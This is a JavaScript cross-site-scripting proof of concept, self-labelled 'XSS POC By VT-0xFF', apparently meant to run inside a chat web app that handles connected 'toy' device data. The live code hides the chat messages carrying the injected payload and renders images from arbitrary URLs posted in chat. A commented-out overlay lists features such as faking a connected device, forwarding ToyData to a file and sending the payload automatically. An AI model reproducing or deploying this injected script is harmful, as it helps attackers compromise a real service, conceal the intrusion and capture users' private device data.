if (!window.__chatCouponCleanerLoaded) {
    window.__chatCouponCleanerLoaded = true;

    const style = document.createElement('style');
    style.textContent = `

    li:has(*[class*="XSS"])  {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
      height: 0px !important;
      max-height: 0px !important;
      overflow: hidden !important;
      position: absolute !important;
      left: -9999px !important;
      pointer-events: none !important;
    }
    li:has(*[class*="tips-disable"]) {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
      height: 0px !important;
      max-height: 0px !important;
      overflow: hidden !important;
      position: absolute !important;
      left: -9999px !important;
      pointer-events: none !important;
    }
    
    .toy-name span {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
    }`;
    document.head.appendChild(style);


    const chatListUl = document.getElementById('lvs-chat-list').children[0];

    if (chatListUl) {
        const observer = new MutationObserver((mutationsList) => {
            for (const mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'LI') {
                            processLi(node);
                        }
                    });
                }

                if (mutation.type === 'subtree' || mutation.type === 'characterData') {
                    const targetLi = mutation.target.closest('li');
                    if (targetLi) {
                        processLi(targetLi);
                    }
                }
            }
        });

        function processLi(li) {
            const p = li.getElementsByClassName("chat-text")[0];
            if (!p) return;
            const text = p.innerText.trim();
            if (text.startsWith("IMG!")) {
                const imgUrl = text.substring(4);
                const alreadyHasImg = p.previousElementSibling?.tagName === 'IMG' &&
                    p.previousElementSibling.src === imgUrl;

                if (!alreadyHasImg) {
                    const img = document.createElement('img');
                    img.src = imgUrl;
                    img.alt = 'Image';
                    img.classList.add("chat-text")
                    img.style["max-width"] = '-webkit-fill-available';
                    p.style.display = 'none';
                    p.parentNode.insertBefore(img, p);
                }
            }
        }

        observer.observe(chatListUl, {
            childList: true,
            subtree: true,
            characterData: true
        });
    }
/*
    const BUTTON_ID = 'persistent-float-button';
    const IFRAME_ID = 'persistent-iframe';

    let isOverlayOpen = false;
    let iframe = null;

    function createFloatingButton() {
        const button = document.createElement('div');
        button.id = BUTTON_ID;
        button.innerHTML = '👨‍💻';
        button.style.cssText = `
                position: fixed !important;
                top: 20px !important;
                right: 20px !important;
                width: 32px !important;
                height: 32px !important;
                background: #333 !important;
                color: white !important;
                border: 1px solid white !important;
                border-radius: 50% !important;
                cursor: pointer !important;
                z-index: 2147483647 !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                font-size: 8px !important;
                line-height: 1 !important;
                box-shadow: 0 2px 6px rgba(0,0,0,0.5) !important;
                transition: all 0.3s ease !important;
                user-select: none !important;
                font-family: Arial, sans-serif !important;
                padding: 0 !important;
                margin: 0 !important;
                box-sizing: border-box !important;
            `;

        button.addEventListener('click', toggleOverlay);
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.1)';
            this.style.backgroundColor = '#555';
        });
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
            this.style.backgroundColor = '#333';
        });

        return button;
    }

    function createIframe() {
        const iframe = document.createElement('iframe');
        iframe.id = IFRAME_ID;
        iframe.style.cssText = `
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                width: 100vw !important;
                height: 100vh !important;
                border: none !important;
                z-index: 2147483646 !important;
                display: none !important;
                background: transparent !important;
            `;

        const iframeContent = `
    <!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(to bottom, #193248, #0E1623, #000612);
            font-family: "Cascadia Code", monospace;
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        .panel {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #ccc;
            border-radius: 10px;
            width: 80%;
            height: 80%;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3), 0 8px 32px rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
        }

        .header {
            padding: 20px 30px;
            border-bottom: 2px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
            background: rgba(255, 255, 255, 0.05);
        }

        .title {
            color: #ffffff;
            font-size: 20px;
            margin: 0;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.7), 0 0 10px rgba(255, 255, 255, 0.5), 0 0 15px rgba(255, 255, 255, 0.3);
            animation: glow 0.5s alternate infinite;
        }
    
        .close-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #ccc;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
            color: #ffffff;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .close-btn:hover {
            background: #45a049;
            transform: scale(1.1);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
        }

        .content {
            flex: 1;
            overflow-x: hidden;
            overflow-y: hidden;
            padding: 30px;
            color: #ffffff;
        }

        .content h3 {
            color: #ffffff;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.7);
            font-size: 18px;
        }

        .content p {
            margin-bottom: 15px;
            line-height: 1.6;
            color: #cccccc;
        }

        .content ul {
            margin-left: 20px;
            margin-bottom: 20px;
        }

        .content li {
            margin-bottom: 8px;
            padding: 10px;
            background-color: rgba(255, 255, 255, 0.1);
            border: 1px solid #444;
            border-radius: 5px;
            max-width: 60%;
            transition: all 0.3s ease;
        }

        .content li:hover {
            background-color: rgba(255, 255, 255, 0.2);
            border-color: #ff9900;
            transform: translateX(5px);
        }

        .content img {
            position: fixed;
            width: 40%;
            top: 11%;
            filter: drop-shadow(2px 4px 6px black) brightness(3);
            left: 62%;
        }

        .content::-webkit-scrollbar {
            width: 12px;
        }

        .content::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
        }

        .content::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, #ff9900, #ffcc00);
            border-radius: 6px;
            border: 2px solid rgba(255, 255, 255, 0.1);
        }

        .content::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, #ffaa00, #ffdd00);
        }

        @keyframes glow {
              from {
                text-shadow: 0 0 5px currentColor, 0 0 10px currentColor, 0 0 15px currentColor;
              }
              to {
                text-shadow: 0 0 10px currentColor, 0 0 15px currentColor, 0 0 20px currentColor;
              }
            }

        .feature-highlight {
            color: #ff9900;
            font-weight: bold;
        }

        .welcome-text {
            font-size: 16px;
            color: #ffffff;
            text-shadow: 0 0 3px rgba(255, 255, 255, 0.5);
        }
    </style>
</head>
<body>
    <div class="panel">
        <div class="header">
            <h2 class="title">XSS POC By VT-0xFF</h2>
            <button class="close-btn" onclick="parent.postMessage('close', '*')">&times;</button>
        </div>
        <div class="content">
            <h3>Welcome!</h3>
            <p class="welcome-text">This is my XSS (Cross Site Scripting) Attack POC!</p>
            
            <h3>Features:</h3>
            <ul>
                <li><span class="feature-highlight">•</span> Hiding the payload</li>
                <li><span class="feature-highlight">•</span> Adding cool features (Images in chat)</li>
                <li><span class="feature-highlight">•</span> Hardly impacting performance</li>
                <li><span class="feature-highlight">•</span> Cool Menu (This One)</li>
                <li><span class="feature-highlight">•</span> Feign a device being connected</li>
                <li><span class="feature-highlight">•</span> Forward any ToyData to a file for further processing</li>
                <li><span class="feature-highlight">•</span> Automatically sending payload</li>
                <li><span class="feature-highlight">•</span> Automatically closing on non-vulnerable POIs (The remote app on IOS/Android)</li>
            </ul>
            
            <p>The panel will automatically recreate itself if removed from the DOM, ensuring it stays persistent on the page.</p>
            <img src="https://raw.githubusercontent.com/VT-0xFF/testrepo/refs/heads/main/dued.png-output.png" alt="POC Image">
        </div>
    </div>

    <script>
        document.body.addEventListener('click', function(e) {
            if (e.target === document.body) {
                parent.postMessage('close', '*');
            }
        });
    </script>
</body>
</html>`;

        iframe.onload = function() {
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(iframeContent);
            doc.close();
        };

        return iframe;
    }

    function toggleOverlay() {
        if (isOverlayOpen) {
            closeOverlay();
        } else {
            openOverlay();
        }
    }

    function openOverlay() {
        if (iframe) {
            iframe.style.display = 'block';
            isOverlayOpen = true;
        }
    }

    function closeOverlay() {
        if (iframe) {
            iframe.style.display = 'none';
            isOverlayOpen = false;
        }
    }

    window.addEventListener('message', function(event) {
        if (event.data === 'close') {
            closeOverlay();
        }
    });

    function initializeElements() {
        const existingButton = document.getElementById(BUTTON_ID);
        const existingIframe = document.getElementById(IFRAME_ID);

        if (existingButton) existingButton.remove();
        if (existingIframe) existingIframe.remove();

        const button = createFloatingButton();
        iframe = createIframe();

        document.body.appendChild(button);
        document.body.appendChild(iframe);

        iframe.src = 'about:blank';
    }

    function setupMutationObserver() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.removedNodes.forEach(function(node) {
                        if (node.id === BUTTON_ID || node.id === IFRAME_ID) {
                            setTimeout(initializeElements, 100);
                        }
                    });
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    function init() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                initializeElements();
                setupMutationObserver();
            });
        } else {
            initializeElements();
            setupMutationObserver();
        }
    }

    init();

    setInterval(function() {
        if (!document.getElementById(BUTTON_ID) || !document.getElementById(IFRAME_ID)) {
            initializeElements();
        }
    }, 5000);
*/
}
